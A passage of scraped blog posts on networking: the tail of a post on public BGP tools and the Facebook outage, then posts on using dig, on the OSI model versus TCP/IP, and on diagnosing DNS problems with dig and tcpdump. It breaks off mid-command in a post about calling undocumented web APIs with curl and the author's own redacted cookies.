 31.13.80.36  is a Facebook IP address in\nToronto, so this server (which is maybe on the US west coast, I’m not sure) is\nnot able to connect to it directly, it needs to go to another AS first. So all of the routes have one or more ASNs \n\n The shortest one is 6939 (“Hurricane Electric”), which is a “global internet backbone”. They also have their own  hurricane electric looking glass  page. \n\n tool 4: BGPlay \n\n All the other tools so far have just shown us the current state of Facebook\nrouting where everything is fine, but this 4th tool lets us see the history of\nthis Facebook BGP internet disaster! It’s a GUI tool so I’m going to include a bunch of screenshots. \n\n The tool is at  https://stat.ripe.net/special/bgplay . I typed in the IP address 129.134.30.12 (one of Facebook’s IPs), if you want to play along. \n\n First, let’s look at the state of things before everything went wrong. I clicked in the timeline at 13:11:28 on Oct. 4, and got this: \n\n \n\n I originally found this very overwhelming. What’s happening? But then someone\non Twitter pointed out that the next place to look is to click on the timeline\nright  after  the Facebook disaster happened (at 18:38 on Oct. 4). \n\n \n\n It’s pretty clear that something is wrong in this picture – all the BGP routes are gone! oh no! \n\n The text at the top shows the last Facebook BGP route disappearing: \n\n Type: W > withdrawal Involving: 129.134.30.0/24\nShort description: The route 50869, 25091, 32934 has been withdrawn.\nDate and time: 2021-10-04 16:02:33 Collected by: 20-91.206.53.12\n \n\n If I then click the “fast forward” button, we see the BGP routes start to come back: \n\n \n\n The first one announced is  137409 32934 . I don’t think this is  actually  the\nfirst one announced though – there are a lot of route announcements inside the\nsame second (at 2021-10-04 21:00:40), and I think the ordering inside BGPlay is arbitrary. \n\n If I click the “fast forward” button again, more and more routes start to come back and routing starts to go back to normal \n\n I found looking at this outage in BGPlay really fun, even though the interface is pretty confusing at first. \n\n maybe it is important to understand a little about BGP? \n\n I started out this post by saying you can’t change BGP routes\nBGP, but then I remembered that in 2016 or 2017 there was a  Telia routing issue  that caused us some minor\nnetwork at work. And when that happens, it is actually useful to understand why\nyour customers can’t reach your site, even if it’s totally out of your control.\nI didn’t know about any of these tools at that time but I would have liked to! \n\n I think for most companies all you can do to respond to outages caused by\nsomeone else’s bad BGP routes is “do nothing and wait for it to get fixed”, but\nit’s nice to be able to  confidently  do nothing. \n\n some ways to publish BGP routes \n\n If you want to (as a hobbyist) actually publish BGP routes, here are some links from the comments: \n\n \n a guide to getting your own ASN \n dn42  seems to have a playground for BGP (it’s not on the public internet, but it does have other people on it which seems more fun than just doing BGP by yourself at home) \n \n\n that’s all for now \n\n I think there are a lot more BGP tools (like PCH has a bunch of  daily snapshots of routing data  which look like fun), but\nthis post is already pretty long and there are other things I need to do today. \n\n I was surprised by how much information I could get about BGP just as a regular\nperson, I always think of it as a “secret network wizard” thing but apparently there\nare all kind of public machines anybody can just telnet to and use to look at the\nroute tables! Who knew! \n\n"},
{"url": "https://jvns.ca/blog/2021/12/04/how-to-use-dig/", "title": "How to use dig", "content": "\n     \n\n Hello! I talked to a couple of friends recently who mentioned they wished they knew\nhow to use  dig  to make DNS queries, so here’s a quick blog post about it. \n\n When I first started using  dig  I found it a bit intimidating – there are so\nmany options! I’m going to leave out most of dig’s options in this post and just\ntalk about the ones I actually use. \n\n Also I learned recently that you can set up a  .digrc  configuration file to make its output\neasier to read and it makes it SO MUCH nicer to use. \n\n I also drew a  zine page about dig  a few years ago, but I wanted to write this post to include a bit more information. \n\n 2 types of dig arguments: query and formatting \n\n There are 2 main types of arguments you can pass to  dig : \n\n \n arguments that tell dig  what DNS query to make \n arguments that tell dig how to  format the response \n \n\n First, let’s go through the query options. \n\n the main query options \n\n The 3 things you usually want to control about a DNS query are: \n\n \n the  name  (like  jvns.ca ). The default is a query for the empty name ( . ). \n the  DNS query type  (like  A  or  CNAME ). The default is  A . \n the  server  to send the query to (like  8.8.8.8 ). The default is what’s in  /etc/resolv.conf . \n \n\n The format for these is: \n\n dig @server type name\n \n\n Here are a couple of examples: \n\n \n dig @8.8.8.8 jvns.ca  queries Google’s public DNS server ( 8.8.8.8 ) for  jvns.ca . \n dig ns jvns.ca  makes an query with type  NS  for  jvns.ca \n \n\n -x : make a reverse DNS query \n\n One other query option I use occasionally is  -x , to make a reverse DNS query. Here’s what the output looks like. \n\n $ dig -x 172.217.13.174\n174.13.217.172.in-addr.arpa. 72888 IN\tPTR\tyul03s04-in-f14.1e100.net.\n \n\n -x  isn’t magic –  dig -x 172.217.13.174  just makes a  PTR  query for\n 174.13.217.172.in-addr.arpa. . Here’s how to make exact the same reverse DNS query\nwithout using  -x . \n\n $ dig ptr 174.13.217.172.in-addr.arpa.\n174.13.217.172.in-addr.arpa. 72888 IN\tPTR\tyul03s04-in-f14.1e100.net.\n \n\n I always use  -x  though because it’s less typing. \n\n options for formatting the response \n\n Now, let’s talk about arguments you can use to format the response. \n\n I’ve found that the way  dig  formats DNS responses by default is pretty\noverwhelming to beginners. Here’s what the output looks like: \n\n ; <<>> DiG 9.16.20 <<>> -r jvns.ca\n;; global options: +cmd\n;; Got answer:\n;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 28629\n;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 4096\n; COOKIE: d87fc3022c0604d60100000061ab74857110b908b274494d (good)\n;; QUESTION SECTION:\n;jvns.ca.\t\t\tIN\tA\n\n;; ANSWER SECTION:\njvns.ca.\t\t276\tIN\tA\t172.64.80.1\n\n;; Query time: 9 msec\n;; SERVER: 192.168.1.1#53(192.168.1.1)\n;; WHEN: Sat Dec 04 09:00:37 EST 2021\n;; MSG SIZE  rcvd: 80\n \n\n If you’re not used to reading this, it might take you a while to sift through it and find the IP address you’re looking for.\nAnd most of the time, you’re only interested in one line of this response ( jvns.ca.        276 IN  A   172.64.80.1 ). \n\n Here are my 2 favourite ways to make dig’s output more manageable. \n\n way 1: +noall +answer \n\n This tells dig to just print what’s in the “Answer” section of the DNS response. Here’s an example of querying for the  NS  records for  google.com . \n\n $ dig +noall +answer ns google.com\ngoogle.com.\t\t158564\tIN\tNS\tns4.google.com.\ngoogle.com.\t\t158564\tIN\tNS\tns1.google.com.\ngoogle.com.\t\t158564\tIN\tNS\tns2.google.com.\ngoogle.com.\t\t158564\tIN\tNS\tns3.google.com.\n \n\n The format here is: \n\n NAME         TTL            TYPE   CONTENT\ngoogle.com   158564   IN    NS     ns3.google.com.\n \n\n By the way: if you’ve ever wondered what  IN  means, it’s the “query class” and\nstands for “internet”. It’s basically just a relic from the 80s and 90s when\nthere were other networks competing with the internet like “chaosnet”. \n\n way 2: +short \n\n This is like  dig +noall +answer , but even shorter – it just shows the\ncontent of each record. For example: \n\n $ dig +short ns google.com\nns2.google.com.\nns1.google.com.\nns4.google.com.\nns3.google.com.\n \n\n you can put formatting options in  digrc \n\n If you don’t like dig’s default format (I don’t!), you can tell it\nto use a different format by default by creating a  .digrc  file in your home\ndirectory. \n\n I really like the  +noall +answer  format, so I put  +noall +answer  in my\n ~/.digrc . Here’s what it looks like for me when I run  dig jvns.ca  using that\nconfiguration file. \n\n $ dig jvns.ca\njvns.ca.\t\t255\tIN\tA\t172.64.80.1\n \n\n So much easier to read! \n\n And if I want to go back to the long format with all of the output (which I\ndo sometimes, usually because I want to look at the records in the Authority\nsection of the response), I can get a long answer again by running: \n\n $ dig +all jvns.ca\n \n\n dig +trace \n\n The last dig option that I use is  +trace .  dig +trace   mimics what a DNS\nresolver does when it looks up a domain – it starts at the root nameservers,\nand then queries the next level of nameservers (like  .com ), and so on until it reaches the authoritative nameserver for the domain.\nSo it’ll make about 30 DNS queries. (I checked using tcpdump, it seems to make 2 queries to get A/AAAA records for each of the root nameservers so that’s already 26 queries. I’m not really sure  why  it does this because it should already have those IPs hardcoded, but it does.) \n\n I find this mostly useful for understanding how DNS works though, I don’t think\nthat I’ve used it to solve a problem. \n\n why dig? \n\n Even though there are simpler tools to make DNS queries (like  dog  and  host ),\nI find myself sticking with dig. \n\n What I like about dig is actually the same thing I  don’t  like about dig – it shows a lot of detail! \n\n I know that if I run  dig +all , it’ll show me all of the sections of the DNS\nresponse. For example, let’s query one of the root nameservers for  jvns.ca .\nThe response has 3 sections I might care about – Answer, Authority, and Additional. \n\n $ dig @h.root-servers.net. jvns.ca +all\n;; Got answer:\n;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 18229\n;; flags: qr rd; QUERY: 1, ANSWER: 0, AUTHORITY: 4, ADDITIONAL: 9\n;; WARNING: recursion requested but not available\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 1232\n;; QUESTION SECTION:\n;jvns.ca.\t\t\tIN\tA\n\n;; AUTHORITY SECTION:\nca.\t\t\t172800\tIN\tNS\tc.ca-servers.ca.\nca.\t\t\t172800\tIN\tNS\tj.ca-servers.ca.\nca.\t\t\t172800\tIN\tNS\tx.ca-servers.ca.\nca.\t\t\t172800\tIN\tNS\tany.ca-servers.ca.\n\n;; ADDITIONAL SECTION:\nc.ca-servers.ca.\t172800\tIN\tA\t185.159.196.2\nj.ca-servers.ca.\t172800\tIN\tA\t198.182.167.1\nx.ca-servers.ca.\t172800\tIN\tA\t199.253.250.68\nany.ca-servers.ca.\t172800\tIN\tA\t199.4.144.2\nc.ca-servers.ca.\t172800\tIN\tAAAA\t2620:10a:8053::2\nj.ca-servers.ca.\t172800\tIN\tAAAA\t2001:500:83::1\nx.ca-servers.ca.\t172800\tIN\tAAAA\t2620:10a:80ba::68\nany.ca-servers.ca.\t172800\tIN\tAAAA\t2001:500:a7::2\n\n;; Query time: 103 msec\n;; SERVER: 198.97.190.53#53(198.97.190.53)\n;; WHEN: Sat Dec 04 11:23:32 EST 2021\n;; MSG SIZE  rcvd: 289\n \n\n dog  also shows the records in the “additional” section , but it’s not super explicit about\nwhich is which (I guess the  +  means it’s in the additional section?). It\ndoesn’t seem to show the records in the “Authority” section. \n\n $ dog @h.root-servers.net. jvns.ca \n  NS ca.                2d0h00m00s A \"c.ca-servers.ca.\"\n  NS ca.                2d0h00m00s A \"j.ca-servers.ca.\"\n  NS ca.                2d0h00m00s A \"x.ca-servers.ca.\"\n  NS ca.                2d0h00m00s A \"any.ca-servers.ca.\"\n   A c.ca-servers.ca.   2d0h00m00s + 185.159.196.2\n   A j.ca-servers.ca.   2d0h00m00s + 198.182.167.1\n   A x.ca-servers.ca.   2d0h00m00s + 199.253.250.68\n   A any.ca-servers.ca. 2d0h00m00s + 199.4.144.2\nAAAA c.ca-servers.ca.   2d0h00m00s + 2620:10a:8053::2\nAAAA j.ca-servers.ca.   2d0h00m00s + 2001:500:83::1\nAAAA x.ca-servers.ca.   2d0h00m00s + 2620:10a:80ba::68\nAAAA any.ca-servers.ca. 2d0h00m00s + 2001:500:a7::2\n \n\n And  host  seems to only show the records in the “answer” section (in this case no records) \n\n $ host jvns.ca h.root-servers.net\nUsing domain server:\nName: h.root-servers.net\nAddress: 198.97.190.53#53\nAliases: \n \n\n Anyway, I think that these simpler DNS tools are great (I even made my own  simple web DNS tool ) and you should\nabsolutely use them if you find them easier but that’s why I stick with dig.\n drill ’s output format seems very similar to  dig ’s though, and maybe  drill \nis better! I haven’t really tried it. \n\n that’s all! \n\n I only learned about  .digrc  recently and I love using it so much, so I hope\nit helps some of you spend less time sorting though dig output! \n\n Someone on Twitter pointed out that it would be nice if there were a way to\ntell dig to show a short version of the response which also included the\nresponse’s status (like  NOERROR ,  NXDOMAIN ,  SERVFAIL , etc), and I agree! I\ncouldn’t find an option in the man page that does that though. \n\n"},
{"url": "https://jvns.ca/blog/2021/05/11/what-s-the-osi-model-/", "title": "The OSI model doesn't map well to TCP/IP", "content": "\n     \n\n TCP/IP  is the set of networking protocols that we use on the modern internet –\nTCP, UDP, IP, ARP, ICMP, DNS, etc. When I talk about “networking”, I’m\nbasically always talking about TCP/IP. \n\n Many explanations of TCP/IP start with something called the “OSI model”. I\ndon’t use the OSI model when explaining networking because when I first\nstarted learning about internet networking I found all of the OSI model\nexplanations really confusing – it wasn’t clear to me at all how the OSI\nmodel corresponded to TCP/IP. \n\n So if you’re just starting to learn about networking and you’re confused about\nthe OSI model, here’s an explanation of how it corresponds to TCP/IP, how\nit doesn’t, and why it’s safe to mostly just ignore it if you don’t find it helpful. \n\n the OSI model has 7 layers \n\n Let’s very briefly discuss what the OSI model is: it’s an abstract model for\nhow networking works with 7 numbered layers: \n\n \n Layer 1: physical layer \n Layer 2: data link \n Layer 3: network \n Layer 4: transport \n Layer 5: session \n Layer 6: presentation \n Layer 7: application \n \n\n I won’t say more about what each of those is supposed to mean, there are a\nthousand explanations of it online. \n\n how the OSI model corresponds to TCP/IP \n\n Some parts of the OSI model do correspond to TCP/IP. Basically for any TCP or\nUDP packet you can split up the packet into different sections and give each\nsection a layer number. \n\n \n Layer 2 corresponds to Ethernet \n Layer 3 corresponds to IP \n Layer 4 corresponds to TCP or UDP (or ICMP etc) \n Layer 7 corresponds to whatever is inside the TCP or UDP packet (for example a DNS query) \n \n\n Here’s a diagram from my  Networking! ACK!  zine showing how you can\nassign layers to different parts of a packet. \n\n \nI just noticed that for some reason this is a UDP packet containing the start\nof a HTTP request which is unrealistic, but let’s go with it, you could make a\nUDP packet like that if you wanted :). I think I did that to save space.\n \n\n \n\n Now that we’ve talked about how the OSI model does correspond to TCP/IP, let’s\ntalk about how it doesn’t! \n\n people refer to layers 2, 3, 4, and 7 all the time \n\n It’s important to know about the OSI model because the terms “layer 2”, “layer\n3”, “layer 4” and “layer 7” are used a LOT. You’ll hear about “layer 2\nrouting”, “layer 7 load balancers”, “layer 4 load balancers”, etc. \n\n So even thought I don’t really use those terms myself when talking about\nnetworking, I need to understand them to be able to read documentation and\nunderstand what people are saying. \n\n there’s no layer 5 or 6 in TCP/IP \n\n I’ve heard a few different interpretations of what layers 5 or 6 could mean in\nTCP/IP, including: \n\n \n TLS is layer 6 \n TCP is actually layers 5 + 6 + 7 smushed together \n \n\n But layers 5 and 6 definitely don’t have a clear correspondence like “every\nlayer has a corresponding header in the TCP packet” the way layers 2, 3, and 4\ndo. \n\n And I’ve never seen anyone actually refer to layer 5 or 6 in practice when\ntalking about TCP/IP, even though people talk about layers 2, 3, 4, and 7 all\nthe time. \n\n what layer is an ARP packet? \n\n Also, some parts of TCP/IP don’t fit well into the OSI model even around\nlayers 2-4 – for example, what layer is an ARP packet? \n\n ARP is a protocol for discovering what MAC address corresponds to an IP\naddress: when a machine wants to know who has a certain IP address, it sends\nout an ARP message saying “help! who is 192.168.1.1?” and it’ll get a response\nfrom the owner of the IP saying “it’s me! I’m 192.168.1.1” \n\n ARP packets contain IP addresses and IP addresses are layer 3, but when people\ntalk about “layer 3” packets they usually mean a packet which have an IP header, and\nARP packets don’t have an IP header, they just have an Ethernet header and\nthen some data on top of that which contains an IP. \n\n the OSI model is a literal description of some obsolete protocols \n\n So, if the OSI model doesn’t literally describe TCP/IP, where did it come\nfrom? \n\n Some very brief research on Wikipedia says that in addition to an abstract\ndescription of 7 layers, the OSI model also contained a  bunch of specific\nprotocols implementing those\nlayers . Apparently this happened\nduring the  Protocol Wars  in the\n70s and 80s, where the OSI model lost and TCP/IP won. \n\n This explains why the OSI model doesn’t really correspond that well to TCP/IP,\nsince if the OSI protocols had “won” then the OSI model  would  correspond\nexactly to how internet networking actually works. \n\n you can talk about specific network protocols instead of using layer numbers \n\n When talking about networking, instead of using numbered layers I like to\ninstead just talk about specific networking protocols I mean. Like\ninstead of “layer 2” I’ll use something like “Ethernet” or “MAC address”. I’ve\nwritten many blog posts talking about MAC addresses and zero posts talking\nabout “layer 2”. \n\n As another example, when talking about load balancers usually I say “HTTP load\nbalancer” instead of “layer 7 load balancer”. Basically every layer 7 load\nbalancer I’ve used has been a HTTP load balancer, and if it’s not using HTTP\nthen I’d rather know which other protocol it’s using! \n\n that’s all! \n\n Hopefully this will help clear things up for somebody!  I wish someone had\ntold me when I started learning networking that I could just learn\napproximately how layers 2, 3, 4, and 7 of the OSI model relate to TCP/IP and\nthen ignore everything else about it. \n\n"},
{"url": "https://jvns.ca/blog/2021/11/04/how-do-you-tell-if-a-problem-is-caused-by-dns/", "title": "How do you tell if a problem is caused by DNS?", "content": "\n     \n\n I was looking into problems people were having with DNS a few months ago and I\nnoticed one common theme – a lot of people have server issues (“my server is\ndown! or it’s slow!“), but they can’t tell if the problem is caused by DNS or\nnot. \n\n So here are a few tools I use to tell if a problem I’m having is caused by DNS,\nas well as a few DNS debugging stories from my life. \n\n I don’t try to interpret browser error messages \n\n First, let’s talk briefly about browser error messages. You might think that\nyour browser will tell you if the problem is DNS or not! And it  could  but\nmine doesn’t seem to do so in any obvious way. \n\n On my machine, if Firefox fails to resolve DNS for a site, it gives me the\nerror:  Hmm. We’re having trouble finding that site. We can’t connect to the\nserver at bananas.wizardzines.com. \n\n But if the DNS succeeds and it just can’t establish a TCP connection to that\nservice, I get the error:  Unable to connect. Firefox can’t establish a\nconnection to the server at localhost:1324 \n\n These two error messages (“we can’t connect to the server” and “firefox can’t\nestablish a connection to the server”) are so similar that I don’t try to\ndistinguish them – if I see any kind of “connection failure” error in the\nbrowser, I’ll immediately go the command line to investigate. \n\n tool 1: error messages \n\n I was complaining about browser error messages being misleading, but\nif you’re writing a program, there’s usually some kind of standard error\nmessage that you get for DNS errors. It often won’t say “DNS” in it, it’ll\nusually be something about “unknown host” or “name or service not found” or\n“getaddrinfo”. \n\n For example, let’s run this Python program: \n\n import requests\nr = requests.get('http://examplezzz.com')\n \n\n This gives me the error message: \n\n socket.gaierror: [Errno -2] Name or service not known\n \n\n If I write the same program in Ruby, I get this error: \n\n Failed to open TCP connection to examplezzzzz.com:80 (getaddrinfo: Name or service not known\n \n\n If I write the same program in Java, I get: \n\n Exception in thread \"main\" java.net.UnknownHostException: examplezzzz.com\n \n\n In Node, I get: \n\n Error: getaddrinfo ENOTFOUND examplezzzz.com\n \n\n These error messages aren’t quite as uniform as I thought they would be, there\nare quite a few different error messages in different languages for exact the\nsame problem, and it depends on the library you’re using too. But if you Google\nthe error you can find out if it means “resolving DNS failed” or not. \n\n tool 2: use  dig  to make sure it’s a DNS problem \n\n For example, the other day I was setting up a new subdomain, let’s say it was\n https://bananas.wizardzines.com . \n\n I set up my DNS, but when I went to the site in Firefox, it wasn’t working. So\nI ran  dig  to check whether the DNS was resolving for that domain, like this: \n\n $ dig bananas.wizardzines.com\n(empty response)\n \n\n I didn’t get a response, which is a failure. A success looks like this: \n\n $ dig wizardzines.com\nwizardzines.com.\t283\tIN\tA\t172.64.80.1\n \n\n Even if my programming language gives me a clear DNS error, I like to use  dig \nto independently confirm because there are still a lot of different error\nmessages and I find them confusing. \n\n tool 3: check against more than one DNS server \n\n There are LOTS of DNS servers, and they often don’t have the same information.\nSo when I’m investigating a potential DNS issue, I like to\nquery more than one server. \n\n For example, if it’s a site on the public internet I’ll both use my local DNS\nserver ( dig domain.com ) and a big public DNS server like 1.1.1.1 or 8.8.8.8\nor 9.9.9.9 ( dig @8.8.8.8 domain.com ). \n\n The other day, I’d set up a new domain, let’s say it was\n https://bananas.wizardzines.com . \n\n Here’s what I did: \n\n \n go to  https://bananas.wizardzines.com  in a browser (spoiler: huge mistake!) \n go to my DNS provider and set up bananas.wizardzines.com \n try to go to  https://bananas.wizardzines.com  in my browser. It fails! Oh no! \n \n\n I wasn’t sure why it failed, so I checked against 2 different DNS servers: \n\n $ dig bananas.wizardzines.com\n$ dig @8.8.8.8 bananas.wizardzines.com\nfeedback.wizardzines.com. 300\tIN\tA\t172.67.209.237\nfeedback.wizardzines.com. 300\tIN\tA\t104.21.85.200\n \n\n From this I could see that  8.8.8.8  actually did have DNS records for my\ndomain, and it was just my local DNS server that didn’t. \n\n This was because I’d gone to  https://bananas.wizardzines.com  in my browser\nbefore I’d created the DNS record (huge mistake!), and then my ISP’s DNS server\ncached the  absence  of a DNS record, so it was returning an empty response\nuntil the negative cached expired. \n\n I googled “negative cache time” and found a Stack Overflow post explaining\nwhere I could find the negative cache TTL (by running  dig SOA\nwizardzines.com ). It turned out the TTL was 3600 seconds or 1 hour, so I just\nneeded to wait an hour for my ISP to update its cache. \n\n tool 4: spy on the DNS requests being made with tcpdump \n\n Another of my favourite things to do is spy on the DNS requests being made and\ncheck if they’re failing. There are at least 3 ways to do this: \n\n \n Use tcpdump ( sudo tcpdump -i any port 53 ) \n Use wireshark \n Use a command line tool I wrote called  dnspeep , which is like tcpdump but just for DNS queries and with friendlier output \n \n\n I’m going to give you 2 examples of DNS problems I diagnosed by\nlooking at the DNS requests being made with  tcpdump . \n\n problem: the case of the slow websites \n\n One day five years ago, my internet was slow. Really slow, it was taking 10+\nseconds to get to websites. I thought “hmm, maybe it’s DNS!”, so started\n tcpdump  and then opened one of the slow sites in my browser. \n\n Here’s what I saw in  tcpdump : \n\n $ sudo tcpdump -n -i any port 53\n12:05:01.125021 wlp3s0 Out IP 192.168.1.181.56164 > 192.168.1.1.53: 11760+ [1au] A? ask.metafilter.com. (59)\n12:05:06.191382 wlp3s0 Out IP 192.168.1.181.56164 > 192.168.1.1.53: 11760+ [1au] A? ask.metafilter.com. (59)\n12:05:11.145056 wlp3s0 Out IP 192.168.1.181.56164 > 192.168.1.1.53: 11760+ [1au] A? ask.metafilter.com. (59)\n12:05:11.746358 wlp3s0 In  IP 192.168.1.1.53 > 192.168.1.181.56164: 11760 2/0/1 CNAME metafilter.com., A 54.244.168.112 (91)\n \n\n The first 3 lines are DNS requests, and they’re separated by 5 seconds.\nBasically this is my browser timing out its DNS queries and retrying them. \n\n Finally, on the 3rd query, a response comes back. \n\n I don’t actually know exactly why this happened, but I restarted my router and\nthe problem went away. Hooray! \n\n (by the way the reason I know that this is the tcpdump output I got 5 years ago is that I\nwrote about it in my  zine on tcpdump ,\nyou can read that zine for free!) \n\n problem: the case of the nginx failure \n\n Earlier this year, I was using  https://fly.io  to set up a website, and I was\nhaving trouble getting nginx to redirect to my site – all the requests were\nfailing. \n\n I eventually got SSH access to the server and ran  tcpdump  and here’s what I saw: \n\n $ tcpdump -i any port 53\n17:16:04.216161 IP6 fly-local-6pn.55356 > fdaa::3.53: 46219+ A? myservice.internal. (42)\n17:16:04.216197 IP6 fly-local-6pn.55356 > fdaa::3.53: 11993+ AAAA? myservice.internal. (42)\n17:16:04.216946 IP6 fdaa::3.53 > fly-local-6pn.55356: 46219 NXDomain- 0/0/0 (42)\n17:16:04.217063 IP6 fly-local-6pn.43938 > fdaa::3.53: 32351+ PTR? 3.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.a.a.d.f.ip6.arpa. (90)\n17:16:04.218378 IP6 fdaa::3.53 > fly-local-6pn.55356: 11993- 1/0/0 AAAA fdaa:0:bff:a7b:aa2:d426:1ab:2 (70)\n17:16:04.461646 IP6 fdaa::3.53 > fly-local-6pn.43938: 32351 NXDomain 0/1/0 (154)\n \n\n This is a bit confusing to read, but basically: \n\n \n nginx requests an A record \n nginx requests an AAAA record \n the DNS server returns an  NXDOMAIN  reply for the A record \n the DNS server returns a successful reply for the AAAA record, with an IPv6 address \n \n\n The  NXDOMAIN  reponse made nginx think that that domain didn’t exist, so it\nignored the IPv6 address it got later. \n\n This was happening because there was a bug in the DNS server – according to the DNS spec it should have been\nreturning  NOERROR  instead of  NXDOMAIN  for the A record. I reported the bug\nand they fixed it right away. \n\n I think it would have been literally impossible for me to guess what was\nhappening here without using  tcpdump  to see what queries nginx was making. \n\n if there are no DNS failures, it can still be a DNS problem \n\n I originally wrote “if you can see the DNS requests, and there are no timeouts\nor failures, the problem isn’t DNS”. But someone on Twitter  pointed out  that this\nisn’t true! \n\n One way you can have a DNS problem even without DNS failures is if your program is doing its own DNS caching. Here’s how that can go wrong: \n\n \n Your program makes a DNS request and caches the result \n 6 days pass \n Your program never updates its IP address \n The IP address for the site changes \n You start getting errors \n \n\n This  is  a DNS problem (your program should be requesting DNS updates more\noften!) but you have to diagnose it by noticing that there are  missing  DNS\nqueries. This one is very tricky and the error messages you’ll get won’t look\nlike they have anything to do with DNS. \n\n that’s all for now \n\n This definitely isn’t a complete list of ways to tell if it’s DNS or not, but I\nhope it helps! \n\n I’d love to hear methods of checking “is it DNS?” that I missed – I’m pretty\nsure I’ve missed at least one important method. \n\n"},
{"url": "https://jvns.ca/blog/2022/03/10/how-to-use-undocumented-web-apis/", "title": "How to use undocumented web APIs", "content": "\n     \n\n Hello! A couple of days I wrote about  tiny personal programs , and I mentioned that\nit can be fun to use “secret” undocumented APIs where you need to copy your\ncookies out of the browser to get access to them. \n\n A couple of people asked how to do this, so I wanted to explain how because\nit’s pretty straightforward. We’ll also talk a tiny bit about what can go\nwrong, ethical issues, and how this applies to your undocumented APIs. \n\n As an example, let’s use Google Hangouts. I’m picking this not because it’s the\nmost useful example (I think there’s an official API which would be much more\npractical to use), but because many sites where this is actually useful are\nsmaller sites that are more vulnerable to abuse. So we’re just going to use\nGoogle Hangouts because I’m 100% sure that the Google Hangouts backend is\ndesigned to be resilient to this kind of poking around. \n\n Let’s get started! \n\n step 1: look in developer tools for a promising JSON response \n\n I start out by going to  https://hangouts.google.com , opening the network tab in\nFirefox developer tools and looking for JSON responses. You can use Chrome developer tools too. \n\n Here’s what that looks like \n\n \n\n The request is a good candidate if it says “json” in the “Type” column” \n\n I had to look around for a while until I found something interesting, but\neventually I found a “people” endpoint that seems to return information about\nmy contacts. Sounds fun, let’s take a look at that. \n\n step 2: copy as cURL \n\n Next, I right click on the request I’m interested in, and click “Copy” -> “Copy as cURL”. \n\n Then I paste the  curl  command in my terminal and run it. Here’s what happens. \n\n $ curl 'https://people-pa.clients6.google.com/v2/people/?key=REDACTED' -X POST ........ (a bunch of headers removed)\nWarning: Binary output can mess up your terminal. Use \"--output -\" to tell \nWarning: curl to output it to your terminal anyway, or consider \"--output \nWarning: <FILE>\" to save to a file.\n \n\n You might be thinking – that’s weird, what’s this “binary output can mess up\nyour terminal” error?  That’s because by default, browsers send an\n Accept-Encoding: gzip, deflate  header to the server, to get compressed\noutput. \n\n We could decompress it by piping the output to  gunzip , but I find it simpler\nto just not send that header. So let’s remove some irrelevant headers. \n\n step 3: remove irrelevant headers \n\n Here’s the full  curl  command line that I got from the browser. There’s a lot here!\nI start out by splitting up the request with backslashes ( \\ ) so that each header is on a different line to make it easier to work with: \n\n curl 'https://people-pa.clients6.google.com/v2/people/?key=REDACTED' \\\n-X POST \\\n-H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0' \\\n-H 'Accept: */*' \\\n-H 'Accept-Language: en' \\\n-H 'Accept-Encoding: gzip, deflate' \\\n-H 'X-HTTP-Method-Override: GET' \\\n-H 'Authorization: SAPISIDHASH REDACTED' \\\n-H 'Cookie: REDACTED'\n-H 'Content-Type: application/x-www-form-urlencoded' \\\n-H 'X-Goog-AuthUser: 0' \\\n-H 'Origin: https://hangouts.google.com' \\\n-H 'Connection: keep-alive' \\\n-H 'Referer: https://hangouts.google.com/' \\\n-H 'Sec-Fetch-Dest: empty' \\\n-H 'Sec-Fetch-Mode: cors' \\\n-H 'Sec-Fetch-Site: same-site' \\\n-H 'Sec-GPC: 1' \\\n-H 'DNT: 1' \\\n-H 'Pragma: no-cache' \\\n-H 'Cache-Control: no-cache' \\\n-H 'TE: trailers' \\\n--data-raw 'personId=101777723309&personId=1175339043204&personId=1115266537043&personId=116731406166&extensionSet.extensionNames=HANGOUTS_ADDITIONAL_DATA&extensionSet.extensionNames=HANGOUTS_OFF_NETWORK_GAIA_GET&extensionSet.extensionNames=HANGOUTS_PHONE_DATA&includedProfileStates=ADMIN_BLOCKED&includedProfileStates=DELETED&includedProfileStates=PRIVATE_PROFILE&mergedPersonSourceOptions.includeAffinity=CHAT_AUTOCOMPLETE&coreIdParams.useRealtimeNotificationExpandedAcls=true&requestMask.includeField.paths=person.email&requestMask.includeField.paths=person.gender&requestMask.includeField.paths=person.in_app_reachability&requestMask.includeField.paths=person.metadata&requestMask.includeField.paths=person.name&requestMask.includeField.paths=person.phone&requestMask.includeField.paths=person.photo&requestMask.includeField.paths=person.read_only_profile_info&requestMask.includeField.paths=person.organization&requestMask.includeField.paths=person.location&requestMask.includeField.paths=person.cover_photo&requestMask.includeContainer=PROFILE&requestMask.includeContainer=DOMAIN_PROFILE&requestMask.includeContainer=CONTACT&key=REDACTED'\n \n\n This can seem like an overwhelming amount of stuff at first, but you don’t need\nto think about what any of it means at this stage. You just need to delete\nirrelevant lines. \n\n I usually just figure out which headers I can delete with trial and error – I\nkeep removing headers until the request starts failing. In general you probably\ndon’t need  Accept* ,  Referer ,  Sec-* ,  DNT ,  User-Agent , and caching\nheaders though. \n\n In this example, I was able to cut the request down to this: \n\n curl 'https://people-pa.clients6.google.com/v2/people/?key=REDACTED' \\\n-X POST \\\n-H 'Authorization: SAPISIDHASH REDACTED' \\\n-H 'Content-Type: application/x-www-form-urlencoded' \\\n-H 'Origin: https://hangouts.google.com' \\\n-H 'Cookie: REDACTED'\\\n--data-raw 